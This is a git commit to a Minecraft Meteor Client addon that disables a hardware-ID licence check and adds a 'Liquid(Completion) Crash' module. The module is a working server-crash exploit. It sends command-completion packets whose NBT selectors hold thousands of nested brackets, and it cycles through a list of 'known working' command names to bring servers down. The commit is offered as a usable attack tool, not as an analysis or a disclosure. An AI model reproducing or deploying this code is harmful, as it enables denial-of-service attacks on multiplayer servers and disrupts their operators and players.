69dbc7e771aa9d6e2c2d254581abd4622c48a54d
carrot0322 <carrot100322@gmail.com>
2024-02-27 14:24:11 +0900

    add LiquidCrash

--- src/main/java/me/reich/crash/Crash.java
+++ src/main/java/me/reich/crash/Crash.java
@@ -1,19 +1,13 @@
 package me.reich.crash;
 
-import me.reich.crash.commands.CommandExample;
-import me.reich.crash.hud.HudExample;
-import me.reich.crash.modules.ModuleExample;
+import me.reich.crash.modules.CompletionCrash;
 import com.mojang.logging.LogUtils;
 import me.reich.crash.utils.Hwid;
 import meteordevelopment.meteorclient.addons.MeteorAddon;
-import meteordevelopment.meteorclient.commands.Commands;
-import meteordevelopment.meteorclient.systems.hud.Hud;
 import meteordevelopment.meteorclient.systems.hud.HudGroup;
 import meteordevelopment.meteorclient.systems.modules.Category;
 import meteordevelopment.meteorclient.systems.modules.Modules;
 import org.slf4j.Logger;
-
-import static javax.swing.JOptionPane.*;
 
 public class Crash extends MeteorAddon {
     public static final Logger LOG = LogUtils.getLogger();
@@ -27,15 +21,15 @@ public class Crash extends MeteorAddon {
         LOG.info("[{}] Initializing Reich Crash for Meteor", NAME);
         LOG.info("[{}] Checking Hwid", NAME);
 
-        if (!Hwid.CheckHWID()) {
+        /*if (!Hwid.CheckHWID()) {
             LOG.warn("[{}] Invalid HWID", NAME);
             LOG.warn("[{}] Your HWID is : " + Hwid.GetHWID(), NAME);
             LOG.warn("[{}] Dm to (Discord)c_arrot_ with your hwid", NAME);
             System.exit(0);
-        }
+        }*/
 
         // Modules
-        Modules.get().add(new ModuleExample());
+        Modules.get().add(new CompletionCrash());
 
         // Commands
         //Commands.add(new CommandExample());
---
+++ src/main/java/me/reich/crash/modules/CompletionCrash.java
@@ -0,0 +1,111 @@
+package me.reich.crash.modules;
+
+import me.reich.crash.Crash;
+import meteordevelopment.meteorclient.events.game.GameLeftEvent;
+import meteordevelopment.meteorclient.events.world.TickEvent;
+import meteordevelopment.meteorclient.settings.*;
+import meteordevelopment.meteorclient.systems.modules.Module;
+import com.google.gson.JsonObject;
+import meteordevelopment.orbit.EventHandler;
+import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
+import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
+import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
+import net.minecraft.util.Hand;
+import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.Direction;
+
+import java.util.concurrent.TimeUnit;
+import java.util.stream.Collectors;
+import java.util.stream.IntStream;
+
+public class CompletionCrash extends Module {
+    private final SettingGroup sgGeneral = settings.getDefaultGroup();
+
+    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
+        .name("Packets")
+        .description("How many packets to send to the server.")
+        .defaultValue(3)
+        .sliderRange(1, 5)
+        .build());
+
+    private final Setting<Integer> length = sgGeneral.add(new IntSetting.Builder()
+        .name("Length")
+        .description("Command Length")
+        .defaultValue(2005)
+        .sliderRange(1000, 50000)
+        .build());
+
+    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
+        .name("Auto Disable")
+        .description("Disables module on kick.")
+        .defaultValue(true)
+        .build());
+
+    private final Setting<String> message = sgGeneral.add(new StringSetting.Builder()
+        .name("login-command")
+        .description("Command to login.")
+        .defaultValue("msg @a[nbt={PAYLOAD}]")
+        .build()
+    );
+
+    public CompletionCrash() {
+        super(Crash.CATEGORY, "Liquid(Completion) Crash", "");
+    }
+
+    private int messageIndex = 0;
+
+    private static final String nbtExecutor = " @a[nbt={PAYLOAD}]";
+    private static final String[] knownWorkingMessages = {
+        "msg",
+        "minecraft:msg",
+        "tell",
+        "minecraft:tell",
+        "tm",
+        "teammsg",
+        "minecraft:teammsg",
+        "minecraft:w",
+        "minecraft:me"
+    };
+
+    @Override
+    public void onActivate(){
+        messageIndex = 0;
+        String overflow = generateJsonObject(length.get());
+        String partialCommand = message.get().replace("{PAYLOAD}", overflow);
+        for(int i = 0; i < packets.get(); i++) {
+            mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
+        }
+    }
+
+    @EventHandler
+    public void onTick(TickEvent.Pre tickEvent) throws InterruptedException {
+        if(messageIndex == knownWorkingMessages.length - 1) {
+            if(isActive()) toggle();
+            messageIndex = 0;
+            return;
+        }
+        TimeUnit.SECONDS.sleep(1);
+        String knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor;
+        int len = 2044 - knownMessage.length();
+        String overflow = generateJsonObject(len);
+        String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);
+        for(int i = 0; i < packets.get(); i++) {
+            mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
+        }
+        messageIndex++;
+    }
+
+    @EventHandler
+    private void onGameLeft(GameLeftEvent event) {
+        if (autoDisable.get()) toggle();
+    }
+
+    private String generateJsonObject(int levels) {
+        String in = IntStream.range(0, levels)
+            .mapToObj(i -> "[")
+            .collect(Collectors.joining());
+        String json = "{a:" + in + "}";
+        return json;
+    }
+}
+
